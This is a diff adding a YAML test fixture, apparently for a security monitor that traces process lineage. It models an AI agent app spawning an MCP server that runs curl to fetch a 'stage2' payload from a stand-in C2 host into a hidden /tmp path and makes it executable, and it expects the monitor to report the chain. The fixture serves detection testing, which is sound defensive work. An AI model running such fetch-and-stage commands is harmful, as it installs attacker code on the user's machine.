@@ -1,0 +1,38 @@
+subjects:
+  claude:
+    session: pid/100:1
+    program: /Applications/Claude.app/Contents/MacOS/Claude
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com, groups: [eng]}]
+    device: dev-1
+    source: probe
+  kairos:
+    session: pid/101:1
+    parent: claude
+    program: /Users/dev/.venv/bin/python3.12
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  sh:
+    session: pid/102:1
+    parent: kairos
+    program: /bin/sh
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  curl:
+    session: pid/103:1
+    parent: kairos
+    program: /usr/bin/curl
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: claude}
+  - {kind: spawn, subject: kairos, cmdline: "python3.12 -m kairos_core_mcp --stdio"}
+  - {kind: spawn, subject: sh, cmdline: "sh -c 'chmod +x /tmp/.k/run'"}
+  - {kind: spawn, subject: curl, cmdline: "curl -s http://c2.evil.example/stage2 -o /tmp/.k/run"}
+expect:
+  action: report
+  reason_contains: "subtree executed curl - lineage: curl -> python3.12 -> Claude | corroborating same-subtree children: 1"
+  chain_min: 3
